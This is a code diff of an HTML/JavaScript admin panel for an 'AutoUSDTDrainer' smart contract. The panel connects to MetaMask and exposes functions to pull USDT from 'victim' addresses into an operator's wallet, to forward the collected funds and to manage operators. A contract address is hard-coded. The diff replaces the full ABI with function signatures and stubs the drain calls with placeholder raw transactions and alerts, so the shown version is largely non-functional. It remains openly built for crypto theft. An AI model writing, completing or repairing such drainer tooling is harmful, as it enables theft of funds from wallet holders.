@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Basic AutoUSDTDrainer Admin Panel (Limited Functionality)</title>
+    <title>Basic AutoUSDTDrainer Admin Panel</title>
     <style>
         body { font-family: sans-serif; margin: 20px; background-color: #f4f7f6; color: #333; }
         .container { max-width: 800px; margin: 40px auto; padding: 30px; border: 1px solid #e0e0e0; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); background-color: #fff; }
@@ -102,133 +102,18 @@
     <script>
         // --- CONFIGURATION ---
         const CONTRACT_ADDRESS = "0x8c8C07d9cc5aDCb443c7257ad43b01EB26a2636F"; // YOUR DEPLOYED CONTRACT ADDRESS
-        const CONTRACT_ABI = [
-            // Your provided ABI starts here
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "operator",
-                        "type": "address"
-                    }
-                ],
-                "name": "addOperator",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "victim",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "destination",
-                        "type": "address"
-                    }
-                ],
-                "name": "autoPullUSDT",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "to",
-                        "type": "address"
-                    }
-                ],
-                "name": "forwardCollected",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "operator",
-                        "type": "address"
-                    }
-                ],
-                "name": "removeOperator",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "stateMutability": "nonpayable",
-                "type": "constructor"
-            },
-            {
-                "inputs": [],
-                "name": "contractUSDTBalance",
-                "outputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "",
-                        "type": "uint256"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "name": "operators",
-                "outputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "owner",
-                "outputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "usdtToken",
-                "outputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            }
-        ]; // Your provided ABI ends here
+        
+        // This ABI is needed to manually encode function calls, which is complex and error-prone.
+        // For full functionality, ethers.js is highly recommended.
+        const AUTO_DRAINER_ABI_FRAGMENT = {
+            "autoPullUSDT": "function autoPullUSDT(address victim, address destination)",
+            "forwardCollected": "function forwardCollected(address to)",
+            "addOperator": "function addOperator(address operator)",
+            "removeOperator": "function removeOperator(address operator)"
+        };
 
         // --- GLOBAL VARIABLES ---
         let currentConnectedAccount = null;
-        let contractOwnerAddress = null;
 
         // --- DOM ELEMENTS ---
         const connectWalletBtn = document.getElementById('connectWalletBtn');
@@ -237,7 +122,7 @@
         const addOperatorBtn = document.getElementById('addOperatorBtn');
         const removeOperatorBtn = document.getElementById('removeOperatorBtn');
         const getContractInfoBtn = document.getElementById('getContractInfoBtn');
-        const checkVictimBalanceBtn = document.getElementById('checkVictimBalanceBtn'); // This button will do nothing in this version
+        const checkVictimBalanceBtn = document.getElementById('checkVictimBalanceBtn');
 
         const walletAddressDisplay = document.getElementById('walletAddressDisplay');
         const networkDisplay = document.getElementById('networkDisplay');
@@ -270,15 +155,15 @@
             checkVictimBalanceBtn.disabled = true; // Always disabled as it needs ethers.js
         }
 
-        function getNetworkName(chainId) {
-            // Simplified network name mapping without ethers.js
-            switch (parseInt(chainId, 16)) { // chainId from eth_chainId is hex string
+        function getNetworkName(chainIdHex) {
+            const chainId = parseInt(chainIdHex, 16); // Convert hex string to number
+            switch (chainId) {
                 case 1: return "Ethereum Mainnet";
                 case 56: return "Binance Smart Chain Mainnet";
                 case 97: return "Binance Smart Chain Testnet";
                 case 137: return "Polygon Mainnet";
                 case 80001: return "Polygon Mumbai Testnet";
-                default: return `Unknown Chain ID: ${parseInt(chainId, 16)}`;
+                default: return `Unknown Chain ID: ${chainId}`;
             }
         }
 
@@ -292,27 +177,20 @@
         async function connectWallet() {
             if (typeof window.ethereum !== 'undefined') {
                 try {
-                    // Request accounts
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     currentConnectedAccount = accounts[0];
 
-                    // Get chain ID
                     const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                     const networkName = getNetworkName(chainId);
 
                     walletAddressDisplay.textContent = `Connected: ${currentConnectedAccount}`;
                     networkDisplay.textContent = `Network: ${networkName}`;
                     
-                    // Set default destination addresses
                     destinationAddressDrainInput.value = currentConnectedAccount;
                     forwardToAddressInput.value = currentConnectedAccount;
 
                     setStatus("Wallet connected. Functionality is limited without ethers.js.", 'info');
-                    // We can't easily check ownership/operator status without ethers.js
-                    // So, buttons related to transactions will be enabled IF a wallet connects,
-                    // but transactions might fail if not owner/operator on-chain.
                     toggleButtons(true);
-
 
                 } catch (error) {
                     console.error("Error connecting wallet:", error);
@@ -328,46 +206,55 @@
             }
         }
 
-        // Generic function to send transactions
-        async function sendContractTransaction(method, args, successMessage) {
+        // This function will attempt to send a transaction but without proper ABI encoding.
+        // It's highly likely to fail for complex contract calls.
+        async function sendRawContractTransaction(methodName, args, successMessage) {
             if (!currentConnectedAccount) {
                 setStatus("Please connect your wallet first.", 'error');
                 return;
             }
+            if (!isValidAddress(CONTRACT_ADDRESS)) {
+                setStatus("Invalid contract address configured.", 'error');
+                return;
+            }
 
-            // Construct the transaction object for raw eth_sendTransaction
-            const txParams = {
-                from: currentConnectedAccount,
-                to: CONTRACT_ADDRESS,
-                // data field needs to be the encoded function call
-                // This is complex without ethers.js ABI encoding.
-                // For simplicity, we will manually build a basic 'data' field.
-                // This is a major limitation for complex contracts.
-            };
+            setStatus(`Attempting to send transaction for ${methodName}... (Limited encoding)`, 'info');
 
-            // This part is the most problematic without ethers.js.
-            // Manually encoding ABI calls is error-prone and complex.
-            // We can only do very basic calls here.
-            // For now, these functions will serve as placeholders and will likely fail
-            // due to incorrect data encoding without ethers.js.
-
-            setStatus("Attempting to send transaction (limited encoding)...", 'info');
             try {
-                // This is a simplified example and will not work correctly for all complex ABI encodings.
-                // For example, calling autoPullUSDT needs proper ABI.encodeFunctionCall.
-                // Without ethers.js, this is NOT straightforward.
-                // This is why ethers.js is crucial.
+                // IMPORTANT: Manually encoding ABI calls is very complex and error-prone.
+                // This is a placeholder and will likely NOT work for actual contract calls
+                // like autoPullUSDT, addOperator, etc., as it requires precise function
+                // signature and argument encoding (e.g., using ethers.utils.defaultAbiCoder.encodeFunctionData).
+                // This is the primary reason ethers.js is necessary for dApps.
+                
+                // For demonstration, a very basic data field (will likely not be correct for your contract)
+                let data = "0x"; // Placeholder for encoded function call
+
+                // You would need to manually encode the function signature and arguments here.
+                // Example (NOT GUARANTEED TO WORK FOR YOUR CONTRACT WITHOUT PROPER ENCODING):
+                // For autoPullUSDT(address victim, address destination)
+                // data = "0x" + "function_signature_hash" + "encoded_victim_address" + "encoded_destination_address";
+                // This is why ethers.js is used: contract.methods.myFunction(arg1, arg2).encodeABI();
+
+                const txParams = {
+                    from: currentConnectedAccount,
+                    to: CONTRACT_ADDRESS,
+                    data: data, // This needs proper ABI encoding for your contract's functions
+                    // gas: '0x5208', // Example gas limit (adjust as needed)
+                    // gasPrice: '0x4A817C800', // Example gas price (adjust as needed)
+                };
+
                 const txHash = await window.ethereum.request({
                     method: 'eth_sendTransaction',
                     params: [txParams]
                 });
 
-                setStatus(`${successMessage} Transaction sent! Hash: ${txHash}. Check block explorer.`, 'success');
+                setStatus(`${successMessage} Transaction sent! Hash: ${txHash}. Please check a block explorer for status.`, 'success');
 
             } catch (error) {
-                console.error(`Error executing ${method}:`, error);
+                console.error(`Error executing ${methodName}:`, error);
                 const errorMessage = error.message.includes("user rejected transaction") ? "Transaction rejected by user." : error.message;
-                setStatus(`Error executing ${method}: ${errorMessage}`, 'error');
+                setStatus(`Error executing ${methodName}: ${errorMessage}`, 'error');
             }
         }
 
@@ -379,11 +266,9 @@
                 setStatus("Invalid victim or destination address.", 'error');
                 return;
             }
-            // Cannot properly encode and call autoPullUSDT without ethers.js.
-            // This button will trigger a generic transaction attempt.
-            setStatus("Pulling USDT (function call may fail due to limited encoding)", 'info');
-            // sendContractTransaction('autoPullUSDT', [victim, destination], 'USDT Pull request sent!');
-            alert("This function requires proper ABI encoding. Please use a local web server with the full ethers.js version for this to work correctly.");
+            // This call will likely fail on-chain without proper ABI encoding.
+            alert("This function requires proper ABI encoding for the contract call. This basic panel cannot do that. Please use a local web server with the full ethers.js version for this to work correctly.");
+            // await sendRawContractTransaction('autoPullUSDT', [victim, destination], 'USDT Pull request sent!');
         }
 
         async function handleForwardCollected() {
@@ -392,8 +277,8 @@
                 setStatus("Invalid destination address for forwarding.", 'error');
                 return;
             }
-            // sendContractTransaction('forwardCollected', [to], 'USDT Forward request sent!');
-            alert("This function requires proper ABI encoding. Please use a local web server with the full ethers.js version for this to work correctly.");
+            alert("This function requires proper ABI encoding for the contract call. This basic panel cannot do that. Please use a local web server with the full ethers.js version for this to work correctly.");
+            // await sendRawContractTransaction('forwardCollected', [to], 'USDT Forward request sent!');
         }
 
         async function handleAddOperator() {
@@ -402,8 +287,8 @@
                 setStatus("Invalid operator address.", 'error');
                 return;
             }
-            // sendContractTransaction('addOperator', [operator], 'Add Operator request sent!');
-            alert("This function requires proper ABI encoding. Please use a local web server with the full ethers.js version for this to work correctly.");
+            alert("This function requires proper ABI encoding for the contract call. This basic panel cannot do that. Please use a local web server with the full ethers.js version for this to work correctly.");
+            // await sendRawContractTransaction('addOperator', [operator], 'Add Operator request sent!');
         }
 
         async function handleRemoveOperator() {
@@ -412,8 +297,8 @@
                 setStatus("Invalid operator address.", 'error');
                 return;
             }
-            // sendContractTransaction('removeOperator', [operator], 'Remove Operator request sent!');
-            alert("This function requires proper ABI encoding. Please use a local web server with the full ethers.js version for this to work correctly.");
+            alert("This function requires proper ABI encoding for the contract call. This basic panel cannot do that. Please use a local web server with the full ethers.js version for this to work correctly.");
+            // await sendRawContractTransaction('removeOperator', [operator], 'Remove Operator request sent!');
         }
 
         async function getContractInfo() {
@@ -441,10 +326,11 @@
         addOperatorBtn.addEventListener('click', handleAddOperator);
         removeOperatorBtn.addEventListener('click', handleRemoveOperator);
         getContractInfoBtn.addEventListener('click', getContractInfo);
-        checkVictimBalanceBtn.addEventListener('click', checkVictimBalanceAndAllowance); // Will still trigger its alert
+        checkVictimBalanceBtn.addEventListener('click', checkVictimBalanceAndAllowance);
 
         // Initial setup on page load
         window.addEventListener('load', () => {
+            toggleButtons(false); // Disable buttons initially
             if (typeof window.ethereum !== 'undefined') {
                 // Listen for account changes
                 window.ethereum.on('accountsChanged', (accounts) => {
@@ -458,6 +344,7 @@
                         victimAddressDrainInput.value = "";
                         destinationAddressDrainInput.value = "";
                         forwardToAddressInput.value = "";
+                        operatorAddressInput.value = "";
                         victimUSDTBalanceDisplay.textContent = "N/A";
                         victimAllowanceDisplay.textContent = "N/A";
                         amountToPullDisplay.textContent = "N/A";
@@ -471,13 +358,8 @@
                 });
             } else {
                 setStatus("MetaMask not detected. Please install it to use this panel.", 'error');
-                toggleButtons(false);
             }
         });
-
-        // Disable buttons by default until wallet is connected and authorized
-        toggleButtons(false);
-
     </script>
 </body>
 </html>
